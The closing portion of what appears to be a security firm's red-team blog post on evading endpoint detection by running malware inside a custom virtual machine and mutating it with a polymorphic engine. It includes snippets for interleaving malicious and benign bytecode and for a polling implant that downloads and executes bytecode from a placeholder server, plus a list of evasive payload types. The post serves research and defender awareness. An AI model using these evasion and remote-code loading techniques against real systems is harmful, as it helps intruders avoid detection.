          <td id="file-vm_call-cpp-L12" class="blob-num js-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-vm_call-cpp-LC12" class="blob-code blob-code-inner js-file-line">vmcall&lt;vminit&gt;::call(malicious_vm, malicious, nullptr);</td>
        </tr>
        <tr>
          <td id="file-vm_call-cpp-L13" class="blob-num js-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-vm_call-cpp-LC13" class="blob-code blob-code-inner js-file-line">vmcall&lt;vminit&gt;::call(events_vm, events, nullptr);</td>
        </tr>
        <tr>
          <td id="file-vm_call-cpp-L14" class="blob-num js-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-vm_call-cpp-LC14" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-vm_call-cpp-L15" class="blob-num js-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-vm_call-cpp-LC15" class="blob-code blob-code-inner js-file-line">while (true) {</td>
        </tr>
        <tr>
          <td id="file-vm_call-cpp-L16" class="blob-num js-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-vm_call-cpp-LC16" class="blob-code blob-code-inner js-file-line">    vmcall&lt;vmexec&gt;::call(malicious_vm, NUM_CYCLES);</td>
        </tr>
        <tr>
          <td id="file-vm_call-cpp-L17" class="blob-num js-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-vm_call-cpp-LC17" class="blob-code blob-code-inner js-file-line">    vmcall&lt;vmexec&gt;::call(events_vm, NUM_CYCLES);</td>
        </tr>
        <tr>
          <td id="file-vm_call-cpp-L18" class="blob-num js-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-vm_call-cpp-LC18" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>

</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/fox-srt/6060d146331322b0c8dc4c9a168c2132/raw/8dfb71f1d6fe915fc5259e2e17cf72d9fec04781/vm_call.cpp" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/fox-srt/6060d146331322b0c8dc4c9a168c2132#file-vm_call-cpp" class="Link--inTextBlock">
          vm_call.cpp
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

</div></figure>



<p class="wp-block-paragraph">Because both sets of bytecode execute within the same virtual machine, and therefore on the same thread, no distinction can be made between the origin of each event. The OS, and any event consumers will observe a single thread generating multiple events, both benign and possibly malicious. Most importantly for an attacker, this could break patterns of behavior being monitored for.</p>



<p class="wp-block-paragraph">As an additional benefit of these added instructions, bytecode can now be obtained and executed at runtime. This proved to be an extremely useful feature during payload development, as instead of staging shellcode during Command and Control, bytecode can be provided. This removes the necessity for allocating executable memory regions (or changing memory protection at a later stage) to execute shellcode in, in turn removing the opportunity for defensive products to inspect buffers used for dynamic code execution often leveraged by attackers.</p>



<p class="wp-block-paragraph">For example, the following behavior could be implemented to create a simple polling implant, requesting bytecode every 10 seconds:</p>



<figure class="wp-block-embed is-type-rich is-provider-embed-handler wp-block-embed-embed-handler"><div class="wp-block-embed__wrapper">
<div style="tab-size: 8" id="gist132182156" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        
<div class="js-gist-file-update-container js-task-list-container">
      <div id="file-polling_bytecode-cpp" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="polling_bytecode.cpp content, created by fox-srt on 07:39AM on August 22, 2024.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  
  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <span>
      This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
    </span>


  <div data-view-component="true" class="flash-action">        <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/" data-view-component="true" class="btn-sm btn">    Show hidden characters
</a>
</div>
</div>

  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
</span>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="polling_bytecode.cpp">
        <tbody><tr>
          <td id="file-polling_bytecode-cpp-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-polling_bytecode-cpp-LC1" class="blob-code blob-code-inner js-file-line">// allocate the virtual machine object</td>
        </tr>
        <tr>
          <td id="file-polling_bytecode-cpp-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-polling_bytecode-cpp-LC2" class="blob-code blob-code-inner js-file-line">auto vm = allocate_vm_object();</td>
        </tr>
        <tr>
          <td id="file-polling_bytecode-cpp-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-polling_bytecode-cpp-LC3" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-polling_bytecode-cpp-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-polling_bytecode-cpp-LC4" class="blob-code blob-code-inner js-file-line">while (true) {</td>
        </tr>
        <tr>
          <td id="file-polling_bytecode-cpp-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-polling_bytecode-cpp-LC5" class="blob-code blob-code-inner js-file-line">    // attempt to obtain bytecode from server</td>
        </tr>
        <tr>
          <td id="file-polling_bytecode-cpp-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-polling_bytecode-cpp-LC6" class="blob-code blob-code-inner js-file-line">    void* bytecode = http_get("<a href="https://example.com/bytecode&amp;quot" rel="nofollow">https://example.com/bytecode&amp;quot</a>;);</td>
        </tr>
        <tr>
          <td id="file-polling_bytecode-cpp-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-polling_bytecode-cpp-LC7" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-polling_bytecode-cpp-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-polling_bytecode-cpp-LC8" class="blob-code blob-code-inner js-file-line">    // check if we received bytecode</td>
        </tr>
        <tr>
          <td id="file-polling_bytecode-cpp-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-polling_bytecode-cpp-LC9" class="blob-code blob-code-inner js-file-line">    if (bytecode) {</td>
        </tr>
        <tr>
          <td id="file-polling_bytecode-cpp-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-polling_bytecode-cpp-LC10" class="blob-code blob-code-inner js-file-line">        // initialize the vm object with our bytecode and execute it in its entirety</td>
        </tr>
        <tr>
          <td id="file-polling_bytecode-cpp-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-polling_bytecode-cpp-LC11" class="blob-code blob-code-inner js-file-line">        vmcall&lt;vminit&gt;::call(vm, bytecode, nullptr);</td>
        </tr>
        <tr>
          <td id="file-polling_bytecode-cpp-L12" class="blob-num js-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-polling_bytecode-cpp-LC12" class="blob-code blob-code-inner js-file-line">        vmcall&lt;vmexec&gt;::call(vm, RUN_UNTIL_END);</td>
        </tr>
        <tr>
          <td id="file-polling_bytecode-cpp-L13" class="blob-num js-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-polling_bytecode-cpp-LC13" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-polling_bytecode-cpp-L14" class="blob-num js-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-polling_bytecode-cpp-LC14" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-polling_bytecode-cpp-L15" class="blob-num js-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-polling_bytecode-cpp-LC15" class="blob-code blob-code-inner js-file-line">    // free the bytecode buffer and sleep for 10 seconds</td>
        </tr>
        <tr>
          <td id="file-polling_bytecode-cpp-L16" class="blob-num js-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-polling_bytecode-cpp-LC16" class="blob-code blob-code-inner js-file-line">    free(bytecode);</td>
        </tr>
        <tr>
          <td id="file-polling_bytecode-cpp-L17" class="blob-num js-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-polling_bytecode-cpp-LC17" class="blob-code blob-code-inner js-file-line">    sleep(10'000);</td>
        </tr>
        <tr>
          <td id="file-polling_bytecode-cpp-L18" class="blob-num js-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-polling_bytecode-cpp-LC18" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>

</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/fox-srt/bef508eb5c2ffa0edb74316e9cf9fec0/raw/0ea73dda83c0cebf5796978edc9bd3687263c3da/polling_bytecode.cpp" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/fox-srt/bef508eb5c2ffa0edb74316e9cf9fec0#file-polling_bytecode-cpp" class="Link--inTextBlock">
          polling_bytecode.cpp
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

</div></figure>



<h2 class="wp-block-heading has-medium-font-size"><strong>Protecting the Virtual Machine</strong></h2>



<p class="wp-block-paragraph">At this point, we have defeated most detection measures that we are aware of, and set out to defeat. However, the VM shares a fundamental weakness with the original packers: static patterns in the native-code VM. Throughout its development, the VM was kept as simple as possible, adhering to constraints set out to enable support for a polymorphic engine to be executed on the VM’s binary code. This made the development significantly more cumbersome, but, given a sufficiently strong polymorphic engine, does close the detection loop fully. The polymorphic engine we developed has been battle tested over several years of use against modern EDR, and antimalware. Despite the fact that the code of the engine was designed years ago, and has not significantly changed since, it still manages to mutate malicious code to the extent that it becomes undetected at runtime and scan time.</p>



<p class="wp-block-paragraph">Due to the way the universe works, the engine cannot support arbitrary programs. The largest constraint is that dynamic control flow is not supported. This means that indirect function calls, indirect jumps and the <code>ret</code> instruction could all potentially break the mutated code. Our engine assumes you know what you’re doing, and won’t complain when such instructions are encountered, but the resulting code will likely not work as intended.</p>



<p class="wp-block-paragraph">The polymorphic engine supports several different mutation techniques, including:</p>



<ul class="wp-block-list">
<li>Instruction substitution: replacing instructions with semantically equivalent ones. For example: <code>mov eax, 0</code> can be replaced with <code>xor eax, eax</code>;</li>



<li>Basic block reordering: changing the order of basic blocks in the code;</li>



<li>Basic block creation: inserting new basic blocks into the code, through jumps and push rets;</li>



<li>NOP instruction insertion: inserting NOP instructions to change the code’s layout.</li>
</ul>



<p class="wp-block-paragraph">The most important feature is that the output of the engine can be fed back into the engine again. This allows for multiple iterations of mutation, which leads to virtually incomprehensible disassembly. This is especially useful when the input is a small piece of code, like a shellcode loader. Sufficient numbers of mutation will double, or quadruple the size of the output, further muddying the waters for defenders.</p>



<h2 class="wp-block-heading"><strong>Conclusion</strong></h2>



<p class="wp-block-paragraph">Due to the ever-changing security landscape, both attackers and defenders must stay on their toes. Defensive security products continue to improve over time, making it more difficult for attackers to remain undetected, or even execute malicious code at all. Detection of payloads has shifted from static analysis to a combination of heuristics and signatures, rendering some tools obsolete.</p>



<p class="wp-block-paragraph">In this blog post, we have described a tool that was written to tackle both static and dynamic analysis by way of virtualisation. This technique, along with employing a custom polymorphic engine attempts to evade these types of analysis by layers of obfuscation. To bypass heuristic analysis, support for multiple virtual machines to run concurrently was added, disrupting patterns in created events. As an added bonus, reverse engineering a sample without prior knowledge could be a daunting task. Analysts would have to reverse not only the morphed virtual machine itself, but extract morphed bytecode for further analysis. This does not remediate the issue of reverse engineering payloads for an attacker, but does significantly slow down the process, providing the attacker with more time.</p>



<p class="wp-block-paragraph">In practice, this project has allowed attacks to remain undetected during Red Teaming and TIBER exercises in some of the most heavily monitored environments, making use of state of the art EDR solutions. Moreover, due to the addition of a transpiler converting compiled binaries into custom bytecode, both the speed and ease of development of custom payloads was greatly improved.</p>



<p class="wp-block-paragraph">The following is a non-exhaustive list of payloads that were created during a recent Red Teaming exercise, successfully evading detection:</p>



<ul class="wp-block-list">
<li>Multiple persistence modules;</li>



<li>Multiple lateral movement modules;</li>



<li>Shellcode and bytecode executor;</li>



<li>Antivirus and EDR patchers;</li>



<li>HTTP(s) and DNS beacons;</li>



<li>Tools querying Active Directory information.</li>
</ul>



<p class="wp-block-paragraph">Porting of additional tools is taking place, and we expect to have virtualized versions of most tools used in a Red Team exercise in the near future.</p>



<h2 class="wp-block-heading has-medium-font-size"><strong>Looking Forward</strong></h2>



<p class="wp-block-paragraph">The motivations for this blog post are two-fold. Firstly, we wanted to share what we think is exciting research with the community. We learned what we did from openly shared blog post and articles, and want to give back to the community. We use all the knowledge we gained to improve the security of our customers through offensive security testing, and we hope that this blog post will help and inspire others to do the same.</p>



<p class="wp-block-paragraph">Secondly, although security products have advanced tremendously, we want to show that there is still room for improvement. We have noticed a tendency to “slap an EDR on it and call it a day” in certain niches of the security industry. Although that might work for some time, because a modern EDR truly adds a strong layer of security, the door is still open for attackers to bypass these products. As the landscape evolves, and general cyber security knowledge increases, the skill and sophistication of cyber criminal elements will rise. Consider this blog post, and the technique explained within, as a warning and a call to action. We hope security vendors will think about how they can detect these types of payloads, and how they can improve their products to stay ahead of the curve, as they are right now.</p>



<h2 class="wp-block-heading">References</h2>


<ol class="wp-block-footnotes"><li id="7585f960-0f16-4135-a8ca-4c1a7afaf522"><a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">https://www.openwall.com/lists/oss-security/2024/03/29/4</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#7585f960-0f16-4135-a8ca-4c1a7afaf522-link" aria-label="Jump to footnote reference 1">↩︎</a></li><li id="44855f57-fd3e-421c-982e-d36328596170"><a href="https://en.wikipedia.org/wiki/Polymorphic_engine">https://en.wikipedia.org/wiki/Polymorphic_engine</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#44855f57-fd3e-421c-982e-d36328596170-link" aria-label="Jump to footnote reference 2">↩︎</a></li><li id="52fb0fbc-3a9b-4589-8e2d-9d1e8d0c061c"><a href="https://en.wikipedia.org/wiki/Executable-space_protection">https://en.wikipedia.org/wiki/Executable-space_protection</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#52fb0fbc-3a9b-4589-8e2d-9d1e8d0c061c-link" aria-label="Jump to footnote reference 3">↩︎</a></li><li id="cfd6c36c-6510-4789-b2d1-c0e4563fe349"><a href="https://en.wikipedia.org/wiki/Metamorphic_code">https://en.wikipedia.org/wiki/Metamorphic_code</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#cfd6c36c-6510-4789-b2d1-c0e4563fe349-link" aria-label="Jump to footnote reference 4">↩︎</a></li><li id="acb3be7f-0d0e-469f-9341-965d785683ff"><a href="https://vmpsoft.com/">https://vmpsoft.com/</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#acb3be7f-0d0e-469f-9341-965d785683ff-link" aria-label="Jump to footnote reference 5">↩︎</a></li><li id="2ebbe913-5b00-48a1-b7b0-e23287e60c0b"><a href="https://en.wikipedia.org/wiki/Opcode">https://en.wikipedia.org/wiki/Opcode</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#2ebbe913-5b00-48a1-b7b0-e23287e60c0b-link" aria-label="Jump to footnote reference 6">↩︎</a></li><li id="c7153637-5f3e-4f28-bf6c-424c707b29e3"><a href="https://en.wikipedia.org/wiki/Bytecode">https://en.wikipedia.org/wiki/Bytecode</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#c7153637-5f3e-4f28-bf6c-424c707b29e3-link" aria-label="Jump to footnote reference 7">↩︎</a></li><li id="1960560c-70db-407a-a395-9e1603895b60"><a href="https://en.wikipedia.org/wiki/Disassembler#Length_disassembler">https://en.wikipedia.org/wiki/Disassembler#Length_disassembler</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#1960560c-70db-407a-a395-9e1603895b60-link" aria-label="Jump to footnote reference 8">↩︎</a></li><li id="389cbcc6-797d-4476-9eba-0e3e964d20ff"><a href="https://en.wikipedia.org/wiki/Streaming_SIMD_Extensions">https://en.wikipedia.org/wiki/Streaming_SIMD_Extensions</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#389cbcc6-797d-4476-9eba-0e3e964d20ff-link" aria-label="Jump to footnote reference 9">↩︎</a></li><li id="745fab9c-8318-41e7-8c04-e5e6ed908584"><a href="https://en.wikipedia.org/wiki/Advanced_Vector_Extensions">https://en.wikipedia.org/wiki/Advanced_Vector_Extensions</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#745fab9c-8318-41e7-8c04-e5e6ed908584-link" aria-label="Jump to footnote reference 10">↩︎</a></li><li id="3e7aeb95-4e7c-44d8-8927-61a261e8050f"><a href="https://www.felixcloutier.com/x86/bt">https://www.felixcloutier.com/x86/bt</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#3e7aeb95-4e7c-44d8-8927-61a261e8050f-link" aria-label="Jump to footnote reference 11">↩︎</a></li><li id="ad0bb794-316c-4597-88f6-ecbc4030e79c"><a href="https://github.com/icedland/iced">https://github.com/icedland/iced</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#ad0bb794-316c-4597-88f6-ecbc4030e79c-link" aria-label="Jump to footnote reference 12">↩︎</a></li><li id="54e90f32-844d-4c9a-b618-0c30b0f819ea"><a href="https://en.wikipedia.org/wiki/Position-independent_code">https://en.wikipedia.org/wiki/Position-independent_code</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#54e90f32-844d-4c9a-b618-0c30b0f819ea-link" aria-label="Jump to footnote reference 13">↩︎</a></li><li id="21563ac9-99ea-4aca-a16e-513b183fc1ad"><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm">https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#21563ac9-99ea-4aca-a16e-513b183fc1ad-link" aria-label="Jump to footnote reference 14">↩︎</a></li><li id="c9c503f8-ef6a-4456-a99d-d3dbe23b07ca"><a href="https://learn.microsoft.com/en-us/cpp/cpp/stdcall">https://learn.microsoft.com/en-us/cpp/cpp/stdcall</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#c9c503f8-ef6a-4456-a99d-d3dbe23b07ca-link" aria-label="Jump to footnote reference 15">↩︎</a></li><li id="beb24e60-5081-4d4d-9893-171865561078"><a href="https://devblogs.microsoft.com/oldnewthing/20160623-00/?p=93735">https://devblogs.microsoft.com/oldnewthing/20160623-00/?p=93735</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#beb24e60-5081-4d4d-9893-171865561078-link" aria-label="Jump to footnote reference 16">↩︎</a></li><li id="92454169-a059-4c6e-bbcb-b92f8bac754c"><a href="https://www.felixcloutier.com/x86/lea">https://www.felixcloutier.com/x86/lea</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#92454169-a059-4c6e-bbcb-b92f8bac754c-link" aria-label="Jump to footnote reference 17">↩︎</a></li><li id="b4e4ab6a-3024-4673-b724-fea7bedd7042"><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#bof_pack">https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#bof_pack</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#b4e4ab6a-3024-4673-b724-fea7bedd7042-link" aria-label="Jump to footnote reference 18">↩︎</a></li><li id="c8fe9216-5079-4cf0-8cfe-7e8c5edd3e6f"><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutine">https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutine</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#c8fe9216-5079-4cf0-8cfe-7e8c5edd3e6f-link" aria-label="Jump to footnote reference 19">↩︎</a></li><li id="77d6f08a-3550-47cd-bb5d-28f618ff8a4e"><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetloadimagenotifyroutine">https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetloadimagenotifyroutine</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#77d6f08a-3550-47cd-bb5d-28f618ff8a4e-link" aria-label="Jump to footnote reference 20">↩︎</a></li><li id="4ccf8e4c-c5db-4e01-a123-6be2ecc6bdc8"><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-">https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/event-tracing-for-windows–etw-</a> <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#4ccf8e4c-c5db-4e01-a123-6be2ecc6bdc8-link" aria-label="Jump to footnote reference 21">↩︎</a></li></ol>


<p class="wp-block-paragraph"></p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul data-sharing-events-added="true"><li class="share-email share-service-visible"><a rel="nofollow noopener noreferrer" data-shared="sharing-email-4865" class="share-email sd-button share-icon" href="mailto:?subject=%5BShared%20Post%5D%20Red%20Teaming%20in%20the%20age%20of%20EDR%3A%20Evasion%20of%20Endpoint%20Detection%20Through%20Malware%20Virtualisation&amp;body=https%3A%2F%2Fblog.fox-it.com%2F2024%2F09%2F25%2Fred-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation%2F&amp;share=email&amp;nb=1" target="_blank" aria-labelledby="sharing-email-4865" data-email-share-error-title="Do you have email set up?" data-email-share-error-text="If you're having problems sharing via email, you might not have email set up for your browser. You may need to create a new email yourself." data-email-share-nonce="ab688d43f8" data-email-share-track-url="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/?share=email" jetpack-share-click-count="0">
				<span id="sharing-email-4865">Email a link to a friend (Opens in new window)</span>
				<span>Email</span>
			</a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-4865" class="share-facebook sd-button share-icon" href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/?share=facebook&amp;nb=1" target="_blank" aria-labelledby="sharing-facebook-4865">
				<span id="sharing-facebook-4865">Share on Facebook (Opens in new window)</span>
				<span>Facebook</span>
			</a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-4865" class="share-linkedin sd-button share-icon" href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/?share=linkedin&amp;nb=1" target="_blank" aria-labelledby="sharing-linkedin-4865">
				<span id="sharing-linkedin-4865">Share on LinkedIn (Opens in new window)</span>
				<span>LinkedIn</span>
			</a></li><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-4865" class="share-twitter sd-button share-icon" href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/?share=twitter&amp;nb=1" target="_blank" aria-labelledby="sharing-twitter-4865">
				<span id="sharing-twitter-4865">Share on X (Opens in new window)</span>
				<span>X</span>
			</a></li><li class="share-pocket"><a rel="nofollow noopener noreferrer" data-shared="sharing-pocket-4865" class="share-pocket sd-button share-icon" href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/?share=pocket&amp;nb=1" target="_blank" aria-labelledby="sharing-pocket-4865">
				<span id="sharing-pocket-4865">Share on Pocket (Opens in new window)</span>
				<span>Pocket</span>
			</a></li><li class="share-end"></li></ul></div></div></div><div class="sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded" id="like-post-wrapper-13954993-4865-699593d221547" data-src="https://widgets.wp.com/likes/?ver=15.6-a.3#blog_id=13954993&amp;post_id=4865&amp;origin=blog.fox-it.com&amp;obj_id=13954993-4865-699593d221547" data-name="like-post-frame-13954993-4865-699593d221547" data-title="Like or Reblog"><h3 class="sd-title">Like this:</h3><div class="likes-widget-placeholder post-likes-widget-placeholder" style="height: 55px;"><span class="button"><span>Like</span></span> <span class="loading">Loading...</span></div><span class="sd-text-color"></span><a class="sd-link-color"></a></div>	</div><!-- .entry-content -->

	<div class="entry-footer">
			</div><!-- .entry-footer -->

	<div class="entry-author-wrapper">
				<div class="site-posted-on">
			<strong>Published</strong>
			<time class="entry-date published updated" datetime="2024-09-25T12:36:12+02:00">September 25, 2024</time>		</div><!-- .site-posted-on -->
	</div>
</article><!-- #post-## -->

			
	
			
		
		</main><!-- #main -->
	</div><!-- #primary -->

		</div><!-- #content -->

		<!-- #colophon -->
	</div><!-- #content-wrapper -->
</div><!-- #page -->

<!--  -->



		<div id="jp-carousel-loading-overlay">
			<div id="jp-carousel-loading-wrapper">
				<span id="jp-carousel-library-loading">&nbsp;</span>
			</div>
		</div>
		<div class="jp-carousel-overlay" style="display: none;">

		<div class="jp-carousel-container">
			<!-- The Carousel Swiper -->
			<div class="jp-carousel-wrap swiper jp-carousel-swiper-container jp-carousel-transitions" itemscope="" itemtype="https://schema.org/ImageGallery">
				<div class="jp-carousel swiper-wrapper"></div>
				<div class="jp-swiper-button-prev swiper-button-prev">
					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
						<mask id="maskPrev" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="9" height="12">
							<path d="M16.2072 16.59L11.6496 12L16.2072 7.41L14.8041 6L8.8335 12L14.8041 18L16.2072 16.59Z" fill="white"></path>
						</mask>
						<g mask="url(#maskPrev)">
							<rect x="0.579102" width="23.8823" height="24" fill="#FFFFFF"></rect>
						</g>
					</svg>
				</div>
				<div class="jp-swiper-button-next swiper-button-next">
					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
						<mask id="maskNext" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="8" height="12">
